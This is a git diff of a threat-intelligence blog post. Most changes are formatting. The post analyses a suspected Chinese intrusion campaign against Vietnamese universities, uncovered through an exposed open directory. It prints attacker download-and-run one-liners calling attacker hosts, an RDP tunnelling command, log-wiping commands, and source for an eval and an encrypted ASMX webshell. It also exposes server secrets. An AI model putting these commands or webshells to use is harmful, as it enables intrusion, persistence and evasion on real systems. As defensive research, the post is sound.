@@ -7,10 +7,16 @@ ribbon: black
 description: "Chinese threat actor targets Vietnemse universities in extensive campaign."
 categories:
   - Threat Research
+content_type: research
 tags:
-  - Threat Research
-  - Malware Analysis
   - China
+  - Vietnam
+  - APT
+  - C2
+  - Malware Analysis
+  - Espionage
+  - Webshell
+  - Exploitation
 toc: true
 redirect_from:
   - /threat%20research/china-vietnam-campaign/
@@ -19,23 +25,23 @@ redirect_from:
 
 > This personal research is based solely on open-source intelligence (OSINT) and technical analysis of available data. The attribution of activity to suspected Chinese threat actors is made on the basis of observed infrastructure, malware, and tactics, techniques, and procedures (TTPs) and strong links to known adversaries. It does not reflect any political stance, the views of my employer, and no conclusions should be drawn beyond the scope of this technical research. The goal of this publication is to share threat intelligence and raise awareness of cyber activity impacting Vietnam, not to promote or endorse any political narrative.
 
-# Open Directories
+## Open Directories
 
-During malware execution chains or hands-on-keyboard intrusions, adversaries will often download additional malware or tooling on the fly, frequently using the HTTP protocol. Adversaries may achieve this by setting a simple Python HTTP server, `python -m http.server 80`, and then accessing the files via a regular HTTP request. 
+During malware execution chains or hands-on-keyboard intrusions, adversaries will often download additional malware or tooling on the fly, frequently using the HTTP protocol. Adversaries may achieve this by setting a simple Python HTTP server, `python -m http.server 80`, and then accessing the files via a regular HTTP request.
 
-Occasionally, when threat actors are hosting payloads over HTTP, they accidentally expose the whole entire directory and subdirectory of files, rather than the singular payload they intended to share. This can introduce a massive operational security failure for adversaries, as additional tooling, victim data, adversary credentials, and more, can be exposed. 
+Occasionally, when threat actors are hosting payloads over HTTP, they accidentally expose the whole entire directory and subdirectory of files, rather than the singular payload they intended to share. This can introduce a massive operational security failure for adversaries, as additional tooling, victim data, adversary credentials, and more, can be exposed.
 
-# Case Study
+## Case Study
 
-In some cases, like the one we will discuss, the OPSEC failure can be so **significant** that an entire *potential* espionage operation can be exposed, within a day. 
+In some cases, like the one we will discuss, the OPSEC failure can be so **significant** that an entire *potential* espionage operation can be exposed, within a day.
 
-The research, identified by us, identified a Chinese threat actor that had successfully compromised a **minimum** of 25 unique Vietnamese universities or educational facilities, many of which specialise in tech and engineering! This was identified via a singular open-directory that exposed massive amounts of sensitive threat actor data. This data did not suggest the threat actor was financially motivated, but rather they intended to persist in victim environments for long periods of time, gathering information. We identified the threat actor has at least 50 victim machines, many of which could be attributed to the same organisation that the threat actor had pivoted around within. 
+The research, identified by us, identified a Chinese threat actor that had successfully compromised a **minimum** of 25 unique Vietnamese universities or educational facilities, many of which specialise in tech and engineering! This was identified via a singular open-directory that exposed massive amounts of sensitive threat actor data. This data did not suggest the threat actor was financially motivated, but rather they intended to persist in victim environments for long periods of time, gathering information. We identified the threat actor has at least 50 victim machines, many of which could be attributed to the same organisation that the threat actor had pivoted around within.
 
-Evidence suggests the threat actor gained access to these organisations via exploitation of public facing vulnerabilities using *Metasploit*, uploading *Godzilla webshells*, or via *SQL injection*. Upon gaining a foothold, the adversary has been observed deploying Cobalt Strike beacons. Once the beacon is established, the actor has exploited local Windows vulnerabilities for privilege escalation and installed tunneling software for persistent remote access. 
+Evidence suggests the threat actor gained access to these organisations via exploitation of public facing vulnerabilities using *Metasploit*, uploading *Godzilla webshells*, or via *SQL injection*. Upon gaining a foothold, the adversary has been observed deploying Cobalt Strike beacons. Once the beacon is established, the actor has exploited local Windows vulnerabilities for privilege escalation and installed tunneling software for persistent remote access.
 
 Based on our observations and victimology, these tactics, techniques, and procedures (TTPs) show significant overlap with previously reported activity attributed to threat actor *Earth Lamia*, named by Trend Micro.
 
-## .bash_history
+### .bash_history
 
 When hunting for interesting open-directories, I always keep an eye out for the Linux `.bash_history` file. This can expose the commands run by an adversary on a Linux machine. It will reside in the user's home folder (e.g. `/home/ben/.bash_history`).
 
@@ -61,7 +67,7 @@ keytool -importkeystore -deststorepass UPNV7J6rqSbc3Ay -destkeypass UPNV7J6rqSbc
 * Threat actor starting Cobalt Strike Teamserver
 
 ```bash
-./teamserver 103.215.77.214 1234567890 jquery-c2.4.5.profile 
+./teamserver 103.215.77.214 1234567890 jquery-c2.4.5.profile
 ./teamserver 103.215.77.214 UPNV7J6rqSbc3Ay CDN.profile
 ```
 
@@ -85,9 +91,9 @@ curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/t
 
 Analysis of the `.bash_history` file reveals the threat actor installing relevant Chinese language packs, setting up and configuring a Cobalt Strike beacon server, installing tunneling software, and downloading Metasploit. From this alone, we cannot say, for definite, whether this is malicious adversarial commands or a potential red team that has a huge OPSEC failure.
 
-However, we have identified evidence of a **modified** Cobalt Strike server on this box. Thankfully, exploring the open-directory, we can recover all relevant Cobalt Strike server data that reveals true intent. 
+However, we have identified evidence of a **modified** Cobalt Strike server on this box. Thankfully, exploring the open-directory, we can recover all relevant Cobalt Strike server data that reveals true intent.
 
-# Cobalt Strike
+## Cobalt Strike
 
 Cobalt Strike is a commercial red-team tool originally built for penetration testers. It provides features like beacon implants, post-exploitation modules, and C2 (command-and-control) management. While designed for defenders to simulate adversaries, cracked versions of Cobalt Strike have been heavily abused by cybercriminals and state-sponsored threat actors worldwide. It’s often used after initial access to move laterally, escalate privileges, and stage payloads.
 
@@ -97,7 +103,7 @@ We observed the threat actor leveraging an open-source modified and cracked Coba
 
 This modified client and server is advertised to have the following capabilities:
 
-* Customised to bypass 360 Total Security  
+* Customised to bypass 360 Total Security
 * Google Two-Factor Authentication (2FA) for C2 Access - *not enabled by the TA*
 * Fixes known vulnerability CVE-2022-39197
 
@@ -107,13 +113,13 @@ This modified client and server is advertised to have the following capabilities
 From a detailed analysis of all the logs, databases, downloads, and other files within this directory, we were able to identify:
 
 * Full lists of victims workstations, their public IP addresses and in some cases credentials
-  * We noticed many of these hostnames followed a regular naming scheme (e.g. JOSH-DC, JOSH-FILE, JOSH-SVR, …) indicating the threat actor had compromised multiple hosts within some organisations. 
+  * We noticed many of these hostnames followed a regular naming scheme (e.g. JOSH-DC, JOSH-FILE, JOSH-SVR, …) indicating the threat actor had compromised multiple hosts within some organisations.
 * The IP addresses the Chinese individuals used to connect to the Cobalt Strike beacon server
 * Configuration files and plain-text credentials
 * Private certificates
 * Commands and malware that were sent to victim machines for execution
 * Sensitive data, including full back-end source code of a Vietnamese university portal, that was downloaded from victim workstations
-* Interestingly, memory dumps from victim machines 
+* Interestingly, memory dumps from victim machines
 
 
 In order to retrieve the full Cobalt Strike beacon victim list, credentials, and commands ran on victim machines, we can view the below files that were left on the open-directory:
@@ -127,14 +133,14 @@ In order to retrieve the full Cobalt Strike beacon victim list, credentials, and
 /CS/server/data/targets.bin
 ```
 
-From the `beacon.db` file, we were able to identify 63 unique workstations that have been infected with a Cobalt Strike beacon. The first registered beacon was the host `WIN-K65K8DF8FOD`, which was beaconing from the Chinese IP address ‘27.150.114[.]115’. This was a test host created by the threat actor, exposing the adversaries public IP address. 
+From the `beacon.db` file, we were able to identify 63 unique workstations that have been infected with a Cobalt Strike beacon. The first registered beacon was the host `WIN-K65K8DF8FOD`, which was beaconing from the Chinese IP address ‘27.150.114[.]115’. This was a test host created by the threat actor, exposing the adversaries public IP address.
 
 The 62 registered beacons that followed this were all beaconing from various Cloudflare AS 13335 IP addresses. Why is this happening? We can look at the file [`/CS/server/CatServer.Properties`](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/CobaltStrike/CatServer.properties):
 
 ```
 # ??????,????????.(?????????cs??,???????,?????TeamSever)
 CatServer.Version = 2.16667
-# TeamSever端口 
+# TeamSever端口
 CatServer.port = 23456
 # 证书路径
 CatServer.store = cfcert.store
@@ -151,14 +157,14 @@ CatServer.profile = CDN.profile
 CatServer.auth = false
 CatServer.authlog = false
 
-#谷歌验证码配置 在微信小程序可直接获取 
+#谷歌验证码配置 在微信小程序可直接获取
 CatServer.googleauth = false
 CatServer.googlekey = YOTPPRZ4RQ75QNKKE65GXE6BQBSQDVQJ
 CatServer.safecode = 123456
 
 (Translated: Google verification code config — can be obtained directly via the WeChat mini-program)
 
-# AES iv 
+# AES iv
 CatServer.Iv = abcdefghijklmnop
 
 # stager配置 建议小改
@@ -204,7 +210,7 @@ print;
 [...REDACTED…]
 ```
 
-From the above, we can see the domain `micrcs.microsoft-defend[.]club` is used for C2 communications. OSINT reveals this is hosted on Cloudflare. 
+From the above, we can see the domain `micrcs.microsoft-defend[.]club` is used for C2 communications. OSINT reveals this is hosted on Cloudflare.
 
 With all the other sensitive threat actor data, a malleable beacon profile was also included [`/CS/server/jquery-c2.4.5.profile`](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/CobaltStrike/jquery-c2.4.5.profile.bak):
 
@@ -216,13 +222,13 @@ set sample_name "jQuery CS 4.5 Profile";
 set sleeptime "45000";         # 45 Seconds
 
 set jitter    "37";            # % jitter
-set data_jitter "100";          
+set data_jitter "100";
 
 set useragent "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
 
 
 https-certificate {
-    
+
 
     set C   "US";
     set CN  "baidu.com";
@@ -264,11 +270,11 @@ dns-beacon {
 [...REDACTED...]
 ```
 
-## Emulating the Adversaries Cobalt Strike Server
+### Emulating the Adversaries Cobalt Strike Server
 
 > We were able to collect these screenshots by using data in the directory to recreate the threat actors' environment in a controlled local environment
 
-As we've recovered **all** relevant databases and binaries surrounding the Cobalt Strike server, we can run the binary using the threat actors configuration and authenticate locally. We will not be receiving call-backs from victims, but, we can interact with the GUI and reporting features built in. 
+As we've recovered **all** relevant databases and binaries surrounding the Cobalt Strike server, we can run the binary using the threat actors configuration and authenticate locally. We will not be receiving call-backs from victims, but, we can interact with the GUI and reporting features built in.
 
 [![2](/assets/images/china/cs_cat1.png)](/assets/images/china/cs_cat1.png){: .full}
 
@@ -279,27 +285,27 @@ From the above, we can see the Cobalt Strike server has got 2 configured listene
 
 [![2](/assets/images/china/censys.png)](/assets/images/china/censys.png){: .full}
 
-Thankfully, as a result of simulating the adversaries Cobalt Strike server in a sandbox, we can also leverage the in-built "Reporting" features to retrieve a forensic-timeline of adverserial activity on each host. This "Reporting" features also mapped the commands and actions performed by the adversary to the MITRE Framework - with a fantastic analysis of the intrusion by the adversaries own C2 server ;) 
+Thankfully, as a result of simulating the adversaries Cobalt Strike server in a sandbox, we can also leverage the in-built "Reporting" features to retrieve a forensic-timeline of adverserial activity on each host. This "Reporting" features also mapped the commands and actions performed by the adversary to the MITRE Framework - with a fantastic analysis of the intrusion by the adversaries own C2 server ;)
 
 [![2](/assets/images/china/cat.png)](/assets/images/china/cat.png){: .full}
 
 [![2](/assets/images/china/ioc_http.png)](/assets/images/china/ioc_http.png){: .full}
 
-From the above, we can see details pertaining to the configuration of the beacon and example HTTP traffic. 
+From the above, we can see details pertaining to the configuration of the beacon and example HTTP traffic.
 
 [![2](/assets/images/china/exploitation.png)](/assets/images/china/exploitation.png){: .full}
 
-Additionally, we can see evidence of execution of a Local Privilege Escalation exploit - [AppxPotato](https://github.com/PN-Tester/AppxPotato) - on multiple hosts. 
+Additionally, we can see evidence of execution of a Local Privilege Escalation exploit - [AppxPotato](https://github.com/PN-Tester/AppxPotato) - on multiple hosts.
 
 [![2](/assets/images/china/processhollowing2.png)](/assets/images/china/processhollowing2.png){: .full}
 
-The reporting features exposed all payloads injected using process hollowing. 
+The reporting features exposed all payloads injected using process hollowing.
 
-# Cobalt Strike Post-Exploitation
+## Cobalt Strike Post-Exploitation
 
-This threat actor appeared to use Cobalt Strike for persistence, privilege escalation, defence evasion, lateral movement and information harvesting. From Cobalt Strike logs, we were able to ascertain commands run and tooling executed by the threat actor: 
+This threat actor appeared to use Cobalt Strike for persistence, privilege escalation, defence evasion, lateral movement and information harvesting. From Cobalt Strike logs, we were able to ascertain commands run and tooling executed by the threat actor:
 
-## Misc
+### Misc
 
 ```
 C:\ProgramData\mdm.txt
@@ -309,7 +315,7 @@ C:\ProgramData\GetCLSID.ps1
 
 Likely staging files. GetCLSID.ps1 could be a script for enumerating COM CLSIDs or checking for hijack opportunities.
 
-## Discovery
+### Discovery
 
 `net user` - lists all user accounts
 
@@ -343,23 +349,23 @@ Likely staging files. GetCLSID.ps1 could be a script for enumerating COM CLSIDs 
 * Looks for firewall rules mentioning port 443 (commonly abused to hide RDP or tunnels).
 
 ```bash
-fscan.exe -h 192.168.1.1/24 -np -no -nopoc 
-fscan.exe -h 192.168.1.1/24 - rf id_rsa.pub 
-fscan.exe -h 192.168.1.1/24 - rs 192.168.1.1:6666 
-fscan.exe -h 192.168.1.1/24 -c whoami fscan.exe - h 192.168.1.1/24 -m ssh -p 2222 
-fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt 
-fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt 
-fscan.exe -h 192.168.1.1/8 
-fscan.exe -h 192.168.1.1/24 -m smb -pwd password 
-fscan.exe -h 192.168.1.1/24 -m ms17010 fscan.exe -hf ip.txt (# ####) 
-fscan.exe -u http://baidu.com -proxy 8080 
-fscan.exe -h 192.168.1.1/24 -nobr -nopoc 
+fscan.exe -h 192.168.1.1/24 -np -no -nopoc
+fscan.exe -h 192.168.1.1/24 - rf id_rsa.pub
+fscan.exe -h 192.168.1.1/24 - rs 192.168.1.1:6666
+fscan.exe -h 192.168.1.1/24 -c whoami fscan.exe - h 192.168.1.1/24 -m ssh -p 2222
+fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt
+fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt
+fscan.exe -h 192.168.1.1/8
+fscan.exe -h 192.168.1.1/24 -m smb -pwd password
+fscan.exe -h 192.168.1.1/24 -m ms17010 fscan.exe -hf ip.txt (# ####)
+fscan.exe -u http://baidu.com -proxy 8080
+fscan.exe -h 192.168.1.1/24 -nobr -nopoc
 fscan.exe -h 192.168.1.1/24 -pa 3389
 ```
 
 * Using niche Chinese network enumeration tooling [fscan](https://github.com/shadow1ng/fscan)
 
-## Execution
+### Execution
 
 ```
 C:\Users\Administrator\Desktop\shell\svhost.exe
@@ -372,7 +378,7 @@ C:\winodws\taskhost.exe
 `C:\Windows\System32\spool\drivers
 \color\e8i580ehei5a3.dll` - Likely malicious DLL
 
-## Persistence
+### Persistence
 
 ```bash
 net user IIS_USER Pass@123 /add
@@ -397,7 +403,7 @@ This allows the adversary to tunnel RDP to their server. See “Command and Cont
 
 
 
-## Defence Evasion
+### Defence Evasion
 
 ```bash
 auditpol /set /category:"Logon/Logoff" /success:disable /failure:disable
@@ -451,24 +457,24 @@ Clear-EventLog -LogName System, Security, Application
 
 * Attempts to wipe all Windows event logs.
 
-## Credential Access
+### Credential Access
 
 ```bash
 DecryptTeamViewer.exe
-``` 
+```
 
 * Red team tooling “to enumerate and decrypt TeamViewer credentials from Windows registry.” - https://github.com/V1V1/DecryptTeamViewer
 
-## Lateral Movement
+### Lateral Movement
 
 ```bash
 SharpExec.exe -m=psexec -i=192.168.1.2 -u=ftp -p=abc@123v -d= -e=C:\Windows\System32\cmd.exe -c=”whoami”
 ```
-## Privilege Escalation
+### Privilege Escalation
 
 `C:\ProgramData\FFICreateAdminUser.exe` - The threat actor leveraged a open source tool developed by `Tas9er` to create new Administrator accounts
 
-From the Cobalt Strike timelines, we were able to ascertain the threat actor attempted to exploit the below vulnerabilities. 
+From the Cobalt Strike timelines, we were able to ascertain the threat actor attempted to exploit the below vulnerabilities.
 
 ```
 CVE-2024-30088, CVE-2023-28252, CVE-2020-0796, CVE-2023-36802, CVE-2018-8120, CVE-2017-0213, CVE-2022-24521, CVE-2021-36955, CVE-2021-1732, CVE-2022-24481, CVE-2023-23376, CVE-2022-35803, CVE-2021-43226, CVE-2024-35250, CVE-2024-26229, CVE-2024-21338, CVE-2021-1675, CVE-2021-40449
@@ -476,7 +482,7 @@ CVE-2024-30088, CVE-2023-28252, CVE-2020-0796, CVE-2023-36802, CVE-2018-8120, CV
 MS13-046, MS16-032, MS15-051
 ```
 
-## Command & Control
+### Command & Control
 
 ```bash
 https://github.com/fatedier/frp/releases/download/v0.36.2/frp_0.36.2_windows_amd64.zip
@@ -502,7 +508,7 @@ The above FRP client will connect to the proxy on `103.215.77[.]214:4444` and tu
 
 [![2](/assets/images/china/image1.png)](/assets/images/china/image1.png){: .full}
 
-* Viewing the threat actors IP address on Censys or Shodan, we can see the hostnames of victim machines exposed on ports like 6008 or 6002, which is a result of the FRP setup. 
+* Viewing the threat actors IP address on Censys or Shodan, we can see the hostnames of victim machines exposed on ports like 6008 or 6002, which is a result of the FRP setup.
 
 ```bash
 xlfrc64.exe -k 123 -i 148.66.16[.]226 -p 47009 -s admin123q
@@ -522,21 +528,21 @@ powershell -c "$l='0.0.0.0';$p=3389;$r='103.215.77[.]214:6665';$s=New-Object Net
 
 `E:\shell\Neo-reGeorg-master\Neo-reGeorg-master\neoreg_servers\tunnel.ashx` - [Open-source Chinese web-shell & tunnel](https://github.com/L-codes/Neo-reGeorg/blob/master/templates/tunnel.ashx)
 
-# VShell
+## VShell
 
-During our investigation, we identified the threat actor leveraging multiple methods for persistent access to target environments. This often included 2 active C2 frameworks (VShell & CS) on a host,  a persistent RDP tunnel, and a webshell. 
+During our investigation, we identified the threat actor leveraging multiple methods for persistent access to target environments. This often included 2 active C2 frameworks (VShell & CS) on a host,  a persistent RDP tunnel, and a webshell.
 
-Aside from using Cobalt Strike for C2, the adversary has heavily leveraged `VShell` for persistent remote access to compromised Vietnamese university web portals. 
+Aside from using Cobalt Strike for C2, the adversary has heavily leveraged `VShell` for persistent remote access to compromised Vietnamese university web portals.
 
-From the file `/vshell/v_windows_amd64/db/data.db` we were able to uncover the full list of the VShell victims. Unlike the CobaltStrike C2, the VShell beacons were reaching straight out to the C2 server, and we were able to recover real victim IP addresses. Additionally, we can see the threat actor had “named” the various victims by their domain name. This made attributing victims incredibly easily. 
+From the file `/vshell/v_windows_amd64/db/data.db` we were able to uncover the full list of the VShell victims. Unlike the CobaltStrike C2, the VShell beacons were reaching straight out to the C2 server, and we were able to recover real victim IP addresses. Additionally, we can see the threat actor had “named” the various victims by their domain name. This made attributing victims incredibly easily.
 
-## Emulating the Adversaries VShell Server
+### Emulating the Adversaries VShell Server
 
 Thankfully for us, using the same emulation method used for Cobalt Strike, we were able to access the VShell dashboard for further intelligence:
 
 [![2](/assets/images/china/vshell.png)](/assets/images/china/vshell.png){: .full}
 
-As you can see, by default, the dashboard is in Chinese. All future screenshots have been translated. 
+As you can see, by default, the dashboard is in Chinese. All future screenshots have been translated.
 
 [![2](/assets/images/china/image12.png)](/assets/images/china/image12.png){: .full}
 
@@ -546,9 +552,9 @@ On the translated “Monitoring Management” tab we can view all configured lis
 
 [![2](/assets/images/china/image5.png)](/assets/images/china/image5.png){: .full}
 
-## VShell - Windows one-liner
+### VShell - Windows one-liner
 
-### Stage 1 
+#### Stage 1
 
 ```
 certutil.exe -urlcache -split -f hxxp://microsoft-symantec[.]art:8848/swt C:\Users\Public\run.bat && C:\Users\Public\run.bat
@@ -556,7 +562,7 @@ certutil.exe -urlcache -split -f hxxp://microsoft-symantec[.]art:8848/swt C:\Use
 
 * This uses the LOLBin, [`certutil.exe`](https://lolbas-project.github.io/lolbas/Binaries/Certutil/), in order to download a secondary payload - `C:\Users\Public.bat`
 
-### Stage 2
+#### Stage 2
 
 We can download the batch script ourselves for further analysis:
 
@@ -581,15 +587,15 @@ start "" %v%
 exit /b 0
 
 We can see this second stage will enumerate the operating systems architecture and write the corresponding binary to the file path C:\Users\Public\07f79946tcp.exe.
-``` 
+```
 
-### Stage 3 - Windows SNOWLIGHT downloader
+#### Stage 3 - Windows SNOWLIGHT downloader
 
 `07f79946tcp.exe`, the third stage, reaches out to the C2 server, `microsoft-symantec[.]art:8848`, for additional payloads or stages to establish persistent Command and Control. We were unable to retrieve these.
 
-Interestingly, reading brilliant analyses by [Mandiant/Google](https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect), [Eclecticiq](https://blog.eclecticiq.com/china-nexus-nation-state-actors-exploit-sap-netweaver-cve-2025-31324-to-target-critical-infrastructures) and [Sysdig](https://www.sysdig.com/blog/unc5174-chinese-threat-actor-vshell), we can see China-nexus adversaries have previously used SNOWLIGHT downloader when deploying VShell or GOREVERSE malware. This reported that a suspected China-nexus actor UNC5174 had been exploiting CVE-2023-46747 on F5 BIG-IP to deploy SNOWLIGHT downloader. Other reporting on this malware all detail it to be a Linux based downloader, typically delivering the core C2 payload. 
+Interestingly, reading brilliant analyses by [Mandiant/Google](https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect), [Eclecticiq](https://blog.eclecticiq.com/china-nexus-nation-state-actors-exploit-sap-netweaver-cve-2025-31324-to-target-critical-infrastructures) and [Sysdig](https://www.sysdig.com/blog/unc5174-chinese-threat-actor-vshell), we can see China-nexus adversaries have previously used SNOWLIGHT downloader when deploying VShell or GOREVERSE malware. This reported that a suspected China-nexus actor UNC5174 had been exploiting CVE-2023-46747 on F5 BIG-IP to deploy SNOWLIGHT downloader. Other reporting on this malware all detail it to be a Linux based downloader, typically delivering the core C2 payload.
 
-Upon analysis of the 3rd stage, `07f79946tcp.exe`, we observed it had similar strings and appeared to used a similar C2 protocol to the previously reported Linux-based SNOWLIGHT samples. 
+Upon analysis of the 3rd stage, `07f79946tcp.exe`, we observed it had similar strings and appeared to used a similar C2 protocol to the previously reported Linux-based SNOWLIGHT samples.
 
 [![2](/assets/images/china/snowlight_elec.png)](/assets/images/china/snowlight_elec.png){: .full}
 
@@ -599,9 +605,9 @@ From Eclecticiq's fantastic analysis, we can see upon execution "SNOWLIGHT perfo
 
 [![2](/assets/images/china/libaries.png)](/assets/images/china/libaries.png){: .full}
 
-* However, it is hidings the true functions it's importing. This Windows variant appears to use a hash-based resolver API to import functions by reading the PEB (Process Environment Block) and from there the Ldr structure which holds lists of all modules it can dynamically import! 
+* However, it is hidings the true functions it's importing. This Windows variant appears to use a hash-based resolver API to import functions by reading the PEB (Process Environment Block) and from there the Ldr structure which holds lists of all modules it can dynamically import!
 
-* With the correct functions resolved, it uses `WinSock` send to the C2 server the banner "w64  " (two spaces), two port bytes "0x22 0x90" (8848), and eight 4-byte tags `"micr" "osof" "t-sy" "mant" "ec.a" "tr\x00\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00"`. 
+* With the correct functions resolved, it uses `WinSock` send to the C2 server the banner "w64  " (two spaces), two port bytes "0x22 0x90" (8848), and eight 4-byte tags `"micr" "osof" "t-sy" "mant" "ec.a" "tr\x00\x00" "\x00\x00\x00\x00" "\x00\x00\x00\x00"`.
 
 * After sending this payload it allocates an area of memory, receive the 4th stage encryped with XOR `0x99`, decrypt, write to memory, and run! This appears to be the same SNOWLIGHT protocol, however the initial banner was for "w64" (Windows 64?) rather than "l64".
 
@@ -609,20 +615,20 @@ From Eclecticiq's fantastic analysis, we can see upon execution "SNOWLIGHT perfo
 
 > Keep an eye out for a follow-up blog where we will discuss this malware further!
 
-## VShell - Linux one-liner
+### VShell - Linux one-liner
 
-### Stage 1 
+#### Stage 1
 
 ```bash
 (curl -fsSL -m180 hxxp://microsoft-symantec[.]art:8848/slt||wget -T180 -q http://microsoft-symantec.art:8848/slt)|sh
 ```
 * We can see this uses `curl` or `wget` to downloaded the payload `hxxp://microsoft-symantec[.]art:8848/slt` and execute it with `sh`.
 
-### Stage 2 - Linux SNOWLIGHT downloader
+#### Stage 2 - Linux SNOWLIGHT downloader
 
 Analysing the 2nd stage, we can see this also shows extremely strong similarities to the SNOWLIGHT samples noted by [Mandiant/Google](https://cloud.google.com/blog/topics/threat-intelligence/initial-access-brokers-exploit-f5-screenconnect) and [Eclecticiq](https://blog.eclecticiq.com/china-nexus-nation-state-actors-exploit-sap-netweaver-cve-2025-31324-to-target-critical-infrastructures).
 
-* Upon execution of our sample, SNOWLIGHT will check for the existence of the file `/tmp/log_de.log`. If this files exists, it will stop execution. However, we couldn't find any evidence of SNOWLIGHT actually writing this file to disk. 
+* Upon execution of our sample, SNOWLIGHT will check for the existence of the file `/tmp/log_de.log`. If this files exists, it will stop execution. However, we couldn't find any evidence of SNOWLIGHT actually writing this file to disk.
 
 [![3](/assets/images/china/snowlight_lin.png)](/assets/images/china/snowlight_lin.png){: .full}
 
@@ -656,7 +662,7 @@ We can look at the Ghidra psuedo-code and see identical capabilities as describe
 
 ```
 
-## VShell - Plugins
+### VShell - Plugins
 
 VShell supports the use of plugins, which can be executed on any of the selected clients. We can see what options that can be used on one of the clients(with the help of the browser translating the page) and any specified arguments we would like to add for said plugin:
 [![3](/assets/images/china/vshell_plugins.png)](/assets/images/china/vshell_plugins.png){: .full}
@@ -672,35 +678,35 @@ f34bd1d485de437fe18360d1e850c3fd64415e49d691e610711d8d232071a0b1  fscan.x64.elf
 
 At the time of this writing, all plugins are accessible within VirusTotal.
 
-## VShell - Payloads
+### VShell - Payloads
 
 We can see VShell has the capabilties to generate payloads in the format `stage`, `shellcode`, `stageless`, `dll stageless`, `listen`, `dll listen`, `ebpf listen`:
 
 [![4](/assets/images/china/vshell1.png)](/assets/images/china/vshell1.png){: .full}
 
-### Notifications
+#### Notifications
 
 Another interesting piece of information with VShell is the ability to integrate with third-party services like `WeChat`. This is likely for SMS/Push notifications when clients check-in, task completion, etc.
 
 [![4](/assets/images/china/vshell_notifs.png)](/assets/images/china/vshell_notifs.png){: .full}
 
-# Webshells / Backdoors
+## Webshells / Backdoors
 
-## test.resources
+### test.resources
 
-### Stage 1
+#### Stage 1
 
-We managed to recover evidence that the threat actor delivered a payload, [`test.resources`](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/Webshells/test.resources), to a compromised web-server. 
+We managed to recover evidence that the threat actor delivered a payload, [`test.resources`](https://github.com/ctrlaltint3l/intelligence/blob/main/VietnameseCampaign/Webshells/test.resources), to a compromised web-server.
 
 [![2](/assets/images/china/test.resources_stage2.png)](/assets/images/china/test.resources_stage2.png){: .full}
 
 Viewing the above serialized object file, `test.resources`, we can see it contains additional code, that would be executed within memory on deserialization, that is currently Base64 encoded and Gzip compressed.
 
-We can use [this](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()) CyberChef receipe to base64 decode and gunzip, giving us a `MZ` header, indicating we have an executable. 
+We can use [this](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Gunzip()) CyberChef receipe to base64 decode and gunzip, giving us a `MZ` header, indicating we have an executable.
 
 [![2](/assets/images/china/decode.png)](/assets/images/china/decode.png){: .full}
 
-### Stage 2 (Web-shell)
+#### Stage 2 (Web-shell)
 
 We can do some initial triage and see this is a .NET binary!
 
@@ -725,7 +731,7 @@ We can see some interesting Base64 encoded text that when decoded is set to the 
 <%@ Page Language="Jscript"%><%Response.Write(eval(Request.Item["z111"],"unsafe"));%>
 ```
 
-The above is a extremely minimal webshell, it takes a HTTP parameter `z111`, then passes it to the `eval()` function - allowing direct JScript execution on the web server. 
+The above is a extremely minimal webshell, it takes a HTTP parameter `z111`, then passes it to the `eval()` function - allowing direct JScript execution on the web server.
 
 We can see in order to execute the JScript/.aspx, the code creates a virtual path `/<current-dir>/fakepath31337`:
 
@@ -733,7 +739,7 @@ We can see in order to execute the JScript/.aspx, the code creates a virtual pat
 string text5 = "/<current-directory>/fakepath31337/";
 ```
 
-With this `text5` variable initialized, the function `HostingEnvironment.RegisterVirtualPathProvider()` is called to provide the file content and file path. This won't be written to disk, it'll be ran dynamically in memory. 
+With this `text5` variable initialized, the function `HostingEnvironment.RegisterVirtualPathProvider()` is called to provide the file content and file path. This won't be written to disk, it'll be ran dynamically in memory.
 
 ```cs
 var samplePathProvider = new SamplePathProvider(text5, fileContent);
@@ -753,11 +759,11 @@ ASP.NET asks the registered VPP for that path → GetFile() returns the in-memor
 
 We can find referencing to this [Chinese security research blog](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E5%88%A9%E7%94%A8%E8%99%9A%E6%8B%9F%E6%96%87%E4%BB%B6%E9%9A%90%E8%97%8FASP.NET-Webshell), which details "Hiding ASP.NET Webshell Using Virtual Files". Specifically, we can see the [GhostWebShell](https://github.com/pwntester/ysoserial.net/blob/master/ExploitClass/GhostWebShell.cs) is being leveraged.
 
-## 3.asmx
+### 3.asmx
 
-Additionally to the above backdoor, the adversary leveraged additional staged, memory-native .NET webshells. 
+Additionally to the above backdoor, the adversary leveraged additional staged, memory-native .NET webshells.
 
-### Stage 1
+#### Stage 1
 
 ```bash
 curl -o D:\WWW\Web\test11.asmx hXXp://103.215.77[.]214:8080/3.asmx
@@ -865,26 +871,26 @@ public class GovService : WebService
 
 ```
 
-* Requests are sent to this web-shell via an ASMX web service - `hxxp://victm.edu.vn/3.asmx/Tas9er?inputParam=<base64_ciphertext>` 
+* Requests are sent to this web-shell via an ASMX web service - `hxxp://victm.edu.vn/3.asmx/Tas9er?inputParam=<base64_ciphertext>`
 * The first request sends AES-encrypted bytes (`key/IV = "93a1d11603dcec67"`) which get decrypted and loaded directly into memory as a .NET assembly (`Assembly.Load`).
 * On later requests, the webshell creates an instance of the class `LY` inside that in-memory assembly and drives it by calling `.Equals(...)` with the `HttpContext`, a `MemoryStream`, and the decrypted input data.
 * Whatever bytes the implant writes to the `MemoryStream` are AES-encrypted again and returned, wrapped with an MD5 prefix and suffix derived from `Tas9er93a1d11603dcec67`.
 
-# Chinese Red Team Tooling
+## Chinese Red Team Tooling
 
 During the intrusion, the threat actor heavily leveraged Chinese developed, or modified, red team tooling or plugins. I hadn't seen any of these used in the wild. We were able to recover evidence the threat actor had delivered the below tools to vicitm machines:
 
